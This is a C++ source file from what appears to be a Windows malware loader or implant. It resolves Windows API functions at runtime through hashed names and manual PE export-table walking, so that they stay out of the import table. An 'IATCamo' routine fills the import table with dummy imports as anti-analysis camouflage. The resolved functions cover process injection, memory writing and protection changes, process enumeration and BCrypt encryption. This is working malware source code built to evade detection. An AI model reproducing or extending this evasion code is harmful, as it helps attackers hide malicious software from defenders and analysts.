// This file contains the function pointers to the ntapi/win32 api functions that are to be dynamically resolved at runtime

#include <API/headers/api.h>
#include <utils/headers/tools.h>
#include <utils/headers/CRTdefs.h>
#include <string>
#include <sstream>
#include <cstdint>
#include <unordered_map>
#include <functional>

#define SEED 5

using namespace API;

template <typename T, T Value>
struct integral_constant {
    static constexpr T value = Value;
};

API::APIResolver API::APIResolver::instance;


// Generate seed for string hashing
consteval int API::RandomCompileTimeSeed(void)
{
    return '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};

constexpr auto g_KEY = API::RandomCompileTimeSeed() % 0xFF; // Create seed variable

// compile time Djb2 hashing function (ASCII)
constexpr DWORD API::HashStringDjb2A(const char* string) {
    ULONG hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *string++)) {
        hash = ((hash << SEED) + hash) + c;
    }

    return hash;
}

APIResolver::~APIResolver()
{
    FreeModules();
}

const API_ACCESS& APIResolver::GetAPIAccess() const
{
    return api;
}


namespace hashes
{
    /* NTDLL */
    constexpr DWORD NtQueryInformationProcess   = integral_constant<DWORD, HashStringDjb2A("NtQueryInformationProcess")>::value;
    constexpr DWORD NtCreateProcess             = integral_constant<DWORD, HashStringDjb2A("NtCreateProcess")>::value;
    constexpr DWORD NtCreateUserProcess         = integral_constant<DWORD, HashStringDjb2A("NtCreateUserProcess")>::value;
    constexpr DWORD NtTerminateProcess          = integral_constant<DWORD, HashStringDjb2A("NtTerminateProcess")>::value;
    constexpr DWORD NtCreateThread              = integral_constant<DWORD, HashStringDjb2A("NtCreateThread")>::value;
    constexpr DWORD LdrLoadDll                  = integral_constant<DWORD, HashStringDjb2A("LdrLoadDll")>::value;
    constexpr DWORD NtOpenProcess               = integral_constant<DWORD, HashStringDjb2A("NtOpenProcess")>::value;
    constexpr DWORD NtCreateFile                = integral_constant<DWORD, HashStringDjb2A("NtCreateFile")>::value;
    constexpr DWORD RtlInitUnicodeString        = integral_constant<DWORD, HashStringDjb2A("RtlInitUnicodeString")>::value;
    constexpr DWORD NtAllocateVirtualMemory     = integral_constant<DWORD, HashStringDjb2A("NtAllocateVirtualMemory")>::value;
    constexpr DWORD NtProtectVirtualMemory      = integral_constant<DWORD, HashStringDjb2A("NtProtectVirtualMemory")>::value;
    constexpr DWORD NtWriteVirtualMemory        = integral_constant<DWORD, HashStringDjb2A("NtWriteVirtualMemory")>::value;
    constexpr DWORD NtFlushInstructionCache     = integral_constant<DWORD, HashStringDjb2A("NtFlushInstructionCache")>::value;
    constexpr DWORD NtDelayExecution            = integral_constant<DWORD, HashStringDjb2A("NtDelayExecution")>::value;
    constexpr DWORD LdrGetProcedureAddress      = integral_constant<DWORD, HashStringDjb2A("LdrGetProcedureAddress")>::value;
    constexpr DWORD RtlRandomEx                 = integral_constant<DWORD, HashStringDjb2A("RtlRandomEx")>::value;


    /* KERNEL32 */
    constexpr DWORD SetFileInformationByHandle = integral_constant<DWORD, HashStringDjb2A("SetFileInformationByHandle")>::value;
    constexpr DWORD CreateToolhelp32Snapshot   = integral_constant<DWORD, HashStringDjb2A("CreateToolhelp32Snapshot")>::value;
    constexpr DWORD Process32First             = integral_constant<DWORD, HashStringDjb2A("Process32First")>::value;
    constexpr DWORD Process32Next              = integral_constant<DWORD, HashStringDjb2A("Process32Next")>::value;

    /* BCRYPT */

    constexpr DWORD BCryptOpenAlgorithmProvider     = integral_constant<DWORD, HashStringDjb2A("BCryptOpenAlgorithmProvider")>::value;
    constexpr DWORD BCryptCloseAlgorithmProvider    = integral_constant<DWORD, HashStringDjb2A("BCryptCloseAlgorithmProvider")>::value;
    constexpr DWORD BCryptGetProperty               = integral_constant<DWORD, HashStringDjb2A("BCryptGetProperty")>::value;
    constexpr DWORD BCryptSetProperty               = integral_constant<DWORD, HashStringDjb2A("BCryptSetProperty")>::value;
    constexpr DWORD BCryptGenerateSymmetricKey      = integral_constant<DWORD, HashStringDjb2A("BCryptGenerateSymmetricKey")>::value;
    constexpr DWORD BCryptEncrypt                   = integral_constant<DWORD, HashStringDjb2A("BCryptEncrypt")>::value;
    constexpr DWORD BCryptDecrypt                   = integral_constant<DWORD, HashStringDjb2A("BCryptDecrypt")>::value;
    constexpr DWORD BCryptDestroyKey                = integral_constant<DWORD, HashStringDjb2A("BCryptDestroyKey")>::value;

    /* ADVAPI32 */

    constexpr DWORD RtlGenRandom = integral_constant<DWORD, HashStringDjb2A("SystemFunction036")>::value;

};

// This function will resolve all of the functions in our API_FUNCTIONS struct
// TODO: split this function up into resolving individual modules, find a way to use a loop instead of having everything hard coded (messy)
void APIResolver::ResolveAPI()
{
    // NTDLL
    api.func.pNtQueryInformationProcess  = reinterpret_cast<NtQueryInformationProcess_t> (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtQueryInformationProcess));
    api.func.pNtCreateProcess            = reinterpret_cast<NtCreateProcess_t>           (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtCreateProcess)); // TODO: Use NtCreateUserProcess instead
    api.func.pNtCreateUserProcess        = reinterpret_cast<NtCreateUserProcess_t>       (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtCreateUserProcess));
    api.func.pNtCreateThread             = reinterpret_cast<NtCreateThread_t>            (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtCreateThread));
    api.func.pLdrLoadDll                 = reinterpret_cast<LdrLoadDll_t>                (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::LdrLoadDll));
    api.func.pNtOpenProcess              = reinterpret_cast<NtOpenProcess_t>             (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtOpenProcess));
    api.func.pNtCreateFile               = reinterpret_cast<NtCreateFile_t>              (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtCreateFile));
    api.func.RtlInitUnicodeString        = reinterpret_cast<RtlInitUnicodeString_t>      (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::RtlInitUnicodeString));
    api.func.pNtAllocateVirtualMemory    = reinterpret_cast<NtAllocateVirtualMemory_t>   (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtAllocateVirtualMemory));
    api.func.pNtProtectVirtualMemory     = reinterpret_cast<NtProtectVirtualMemory_t>    (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtProtectVirtualMemory));
    api.func.pNtWriteVirtualMemory       = reinterpret_cast<NtWriteVirtualMemory_t>      (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtWriteVirtualMemory));
    api.func.pNtFlushInstructionCache    = reinterpret_cast<NtFlushInstructionCache_t>   (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtFlushInstructionCache));
    api.func.pNtDelayExecution           = reinterpret_cast<NtDelayExecution_t>          (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtDelayExecution));
    api.func.pLdrGetProcedureAddress     = reinterpret_cast<LdrGetProcedureAddress_t>    (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::LdrGetProcedureAddress));
    api.func.pRtlRandomEx                = reinterpret_cast<RtlRandomEx_t>               (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::RtlRandomEx));

    // Kernel32
    api.func.pSetFileInformationByHandle = reinterpret_cast<SetFileInformationByHandle_t>(GetProcessAddressByHash(this->api.mod.Kernel32, hashes::SetFileInformationByHandle));
    api.func.pCreateToolhelp32Snapshot   = reinterpret_cast<CreateToolhelp32Snapshot_t>  (GetProcessAddressByHash(this->api.mod.Kernel32, hashes::CreateToolhelp32Snapshot));
    api.func.pProcess32First             = reinterpret_cast<Process32First_t>            (GetProcessAddressByHash(this->api.mod.Kernel32, hashes::Process32First));
    api.func.pProcess32Next              = reinterpret_cast<Process32Next_t>             (GetProcessAddressByHash(this->api.mod.Kernel32, hashes::Process32Next));


    // BCrypt

    api.func.pBCryptOpenAlgorithmProvider  = reinterpret_cast<BCryptOpenAlgorithmProvider_t> (GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptOpenAlgorithmProvider));
    api.func.pBCryptCloseAlgorithmProvider = reinterpret_cast<BCryptCloseAlgorithmProvider_t>(GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptCloseAlgorithmProvider));
    api.func.pBCryptGetProperty            = reinterpret_cast<BCryptGetProperty_t>           (GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptGetProperty));
    api.func.pBCryptSetProperty            = reinterpret_cast<BCryptSetProperty_t>           (GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptSetProperty));
    api.func.pBCryptGenerateSymmetricKey   = reinterpret_cast<BCryptGenerateSymmetricKey_t>  (GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptGenerateSymmetricKey));
    api.func.pBCryptEncrypt                = reinterpret_cast<BCryptEncrypt_t>               (GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptEncrypt));
    api.func.pBCryptDecrypt                = reinterpret_cast<BCryptDecrypt_t>               (GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptDecrypt));
    api.func.pBCryptDestroyKey             = reinterpret_cast<BCryptDestroyKey_t>            (GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptDestroyKey));
    api.func.pBCryptCloseAlgorithmProvider = reinterpret_cast<BCryptCloseAlgorithmProvider_t>(GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptCloseAlgorithmProvider));

    // Advapi32

    //api.func.pRtlGenRandom                 = reinterpret_cast<RtlGenRandom_t>                (GetProcessAddressByHash(this->api.mod.Advapi32, hashes::RtlGenRandom));

    // fuck the hash
    //api.func.pRtlGenRandom = reinterpret_cast<RtlGenRandom_t>(GetProcessAddress(this->api.mod.Advapi32, "SystemFunction036"));

    //TODO: figure out why GetProcessAddressByHash isn't working for this function - might have to use LdrGetProcedureAddress
   // api.func.pRtlGenRandom = reinterpret_cast<RtlGenRandom_t>(GetProcAddress(this->api.mod.Advapi32, "SystemFunction036"));


}

void *API::APIResolver::_(void** ppAddress)
{
    void *pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
    if (!pAddress)
        return NULL;

    // set the first 4 byte in pAddress to a random number
    *(int*)pAddress = RandomCompileTimeSeed() % 0xFF;

    *ppAddress = pAddress;

    return pAddress;
}


void APIResolver::LoadModules()
{
    // TODO: either use custom GetModuleHandle or use LdrLoadDll with obfuscated dll names
    // if using LdrLoadDll we can first load essential modules, resolve LdrLoadDll then get handles to other modules
    this->api.mod.Kernel32 = GetModuleHandleA("kernel32.dll");
    this->api.mod.Ntdll    = GetModuleHandleA("ntdll.dll");
    this->api.mod.BCrypt   = LoadLibraryA("BCrypt.dll");
    this->api.mod.Advapi32 = LoadLibraryA("Advapi32.dll");

    if (!this->api.mod.Kernel32)
        return;
    if (!this->api.mod.Ntdll)
        return;
    if (!this->api.mod.BCrypt)
        return;
    if (!this->api.mod.Advapi32)
        return;
}

// TODO: move this to antianalysis
void API::APIResolver::IATCamo()
{
    void		*pAddress = NULL;
    int* dummy = (int*)_(&pAddress);

    if (*dummy > 350) {
        unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
        i = GetLastError();
        i = SetCriticalSectionSpinCount(NULL, NULL);
        i = GetWindowContextHelpId(NULL);
        i = GetWindowLongPtrW(NULL, NULL);
        i = RegisterClassW(NULL);
        i = IsWindowVisible(NULL);
        i = ConvertDefaultLocale(NULL);
        i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
        i = IsDialogMessageW(NULL, NULL);
    }
    HeapFree(GetProcessHeap(), 0, pAddress);
}

void APIResolver::FreeModules()
{
    if (this->api.mod.Kernel32)
        FreeLibrary(api.mod.Kernel32);
    if (this->api.mod.Ntdll)
        FreeLibrary(api.mod.Ntdll);
    if (this->api.mod.BCrypt)
        FreeLibrary(api.mod.BCrypt);
    if (this->api.mod.Advapi32)
        FreeLibrary(api.mod.Advapi32);
}

uintptr_t API::GetProcessAddressByHash(void* pBase, DWORD func)
{
    PIMAGE_DOS_HEADER       pDosHeader  = nullptr;
    PIMAGE_NT_HEADERS       pNtHeaders  = nullptr;
    PIMAGE_FILE_HEADER      pFileHeader = nullptr;
    PIMAGE_OPTIONAL_HEADER  pOptHeader  = nullptr;
    PIMAGE_EXPORT_DIRECTORY pExportDir  = nullptr;

    DWORD exports_size = NULL;
    DWORD exports_rva  = NULL;

    unsigned char* pBaseAddr = reinterpret_cast<unsigned char*>(pBase);
    
    pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(pBaseAddr);

    // Check magic number 
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        //tools.ShowError("Program Invalid: Incorrect DOS signature");
        return NULL;
    }

    pNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<char*>(pBaseAddr) + pDosHeader->e_lfanew); // Get pointer to the NT headers

    // Get File and Optional headers
    pFileHeader = &pNtHeaders->FileHeader;
    pOptHeader  = &pNtHeaders->OptionalHeader;


    // Verify that there is enough space for the NT headers
    if (pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) > pOptHeader->SizeOfImage)
    {
        //tools.ShowError("Program Invalid: Insufficient space for NT headers");
        return NULL;
    }

    // Verify that the optional header contains enough data directories
    if (pOptHeader->NumberOfRvaAndSizes < IMAGE_DIRECTORY_ENTRY_EXPORT + 1)
    {
        // tools.ShowError("Program Invalid: Insufficient data directories");
        return NULL;
    }

    // Get the size and virtual address of the export directory
    exports_size = pOptHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    exports_rva  = pOptHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    // Verify that the export directory is within the image boundaries
    if (exports_rva + exports_size > pOptHeader->SizeOfImage)
    {
        //tools.ShowError("Program Invalid: Export directory out of bounds");
        return NULL;
    }

    pExportDir   = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(reinterpret_cast<char*>(pBaseAddr) + exports_rva);   // Get the RVA
    DWORD* pEAT  = reinterpret_cast<DWORD*>(reinterpret_cast<char*>(pBaseAddr) + pExportDir->AddressOfFunctions); // Address of Export Address Table functions
    DWORD* pENPT = reinterpret_cast<DWORD*>(reinterpret_cast<char*>(pBaseAddr) + pExportDir->AddressOfNames);     // Address of Export Name Pointer Table 


    // Iterate through the functions in the export directory and check for a match
    for (unsigned int i = 0; i < pExportDir->NumberOfNames; ++i)
    {
        char* szNames = reinterpret_cast<char*>(pBaseAddr + reinterpret_cast<unsigned long*>(pBaseAddr + pExportDir->AddressOfNames)[i]);

        if (HashStringDjb2A(szNames) == func)
        {
            unsigned short usOrdinal = reinterpret_cast<unsigned short*>(pBaseAddr + pExportDir->AddressOfNameOrdinals)[i];
            uintptr_t address        = reinterpret_cast<uintptr_t>      (pBaseAddr + reinterpret_cast<unsigned long*>(pBaseAddr + pExportDir->AddressOfFunctions)[usOrdinal]);

            // Check if the function is forwarded
            if (address >= reinterpret_cast<uintptr_t>(pExportDir) && address < reinterpret_cast<uintptr_t>(pExportDir) + exports_size)
            {
                char cForwarderName[MAX_PATH] = { 0 };
                char* pcFunctionMod           = nullptr;
                char* pcFunctionName          = nullptr;
                DWORD dwDotOffset             = 0x0;

                memcpy(cForwarderName, reinterpret_cast<void*>(address), strlen(reinterpret_cast<char*>(address)));

                for (int j = 0; j < strlen(cForwarderName); j++)
                {
                    if (cForwarderName[j] == '.')
                    {
                        dwDotOffset = j;
                        cForwarderName[j] = NULL;
                        break;
                    }
                }

                pcFunctionMod  = cForwarderName;
                pcFunctionName = cForwarderName + dwDotOffset + 1;

                return GetProcessAddressByHash(LoadLibraryA(pcFunctionMod), HashStringDjb2A(pcFunctionName)); // TODO: use pLdrLoadDll, or use a custom loadlibrary function
            }
            return address;
        }
    }

    return NULL;
}


uintptr_t API::GetProcessAddress(void* pBase, char *func)
{
    PIMAGE_DOS_HEADER       pDosHeader  = nullptr;
    PIMAGE_NT_HEADERS       pNtHeaders  = nullptr;
    PIMAGE_FILE_HEADER      pFileHeader = nullptr;
    PIMAGE_OPTIONAL_HEADER  pOptHeader  = nullptr;
    PIMAGE_EXPORT_DIRECTORY pExportDir  = nullptr;

    DWORD exports_size = NULL;
    DWORD exports_rva = NULL;

    unsigned char* pBaseAddr = reinterpret_cast<unsigned char*>(pBase);
 
    pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(pBaseAddr);

    // Check magic number 
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;
    

    pNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<char*>(pBaseAddr) + pDosHeader->e_lfanew); // Get pointer to the NT headers

    // Get File and Optional headers
    pFileHeader = &pNtHeaders->FileHeader;
    pOptHeader  = &pNtHeaders->OptionalHeader;


    // Verify that there is enough space for the NT headers
    if (pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) > pOptHeader->SizeOfImage)
        return NULL;

    // Verify that the optional header contains enough data directories
    if (pOptHeader->NumberOfRvaAndSizes < IMAGE_DIRECTORY_ENTRY_EXPORT + 1)
        return NULL;
    

    // Get the size and virtual address of the export directory
    exports_size = pOptHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    exports_rva  = pOptHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    // Verify that the export directory is within the image boundaries
    if (exports_rva + exports_size > pOptHeader->SizeOfImage)
        return NULL;
    

    pExportDir   = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(reinterpret_cast<char*>(pBaseAddr) + exports_rva);   // Get the RVA
    DWORD* pEAT  = reinterpret_cast<DWORD*>(reinterpret_cast<char*>(pBaseAddr) + pExportDir->AddressOfFunctions); // Address of Export Address Table functions
    DWORD* pENPT = reinterpret_cast<DWORD*>(reinterpret_cast<char*>(pBaseAddr) + pExportDir->AddressOfNames);     // Address of Export Name Pointer Table 


    // Iterate through the functions in the export directory and check for a match
    for (unsigned int i = 0; i < pExportDir->NumberOfNames; ++i)
    {
        char* szNames = reinterpret_cast<char*>(pBaseAddr + reinterpret_cast<unsigned long*>(pBaseAddr + pExportDir->AddressOfNames)[i]);

        if (strcmp(szNames, func) == 0)
        {
            unsigned short usOrdinal = reinterpret_cast<unsigned short*>(pBaseAddr + pExportDir->AddressOfNameOrdinals)[i];
            uintptr_t address        = reinterpret_cast<uintptr_t>      (pBaseAddr + reinterpret_cast<unsigned long*>(pBaseAddr + pExportDir->AddressOfFunctions)[usOrdinal]);

            // Check if the function is forwarded
            if (address >= reinterpret_cast<uintptr_t>(pExportDir) && address < reinterpret_cast<uintptr_t>(pExportDir) + exports_size)
            {
                char cForwarderName[MAX_PATH] = { 0 };
                char* pcFunctionMod           = nullptr;
                char* pcFunctionName          = nullptr;
                DWORD dwDotOffset             = 0x0;

                memcpy(cForwarderName, reinterpret_cast<void*>(address), strlen(reinterpret_cast<char*>(address)));

                for (int j = 0; j < strlen(cForwarderName); j++)
                {
                    if (cForwarderName[j] == '.')
                    {
                        dwDotOffset       = j;
                        cForwarderName[j] = NULL;
                        break;
                    }
                }

                pcFunctionMod  = cForwarderName;
                pcFunctionName = cForwarderName + dwDotOffset + 1;

                return GetProcessAddress(LoadLibraryA(pcFunctionMod), pcFunctionName); // TODO: use pLdrLoadDll
            }
            return address;
        }
    }

    return NULL;
}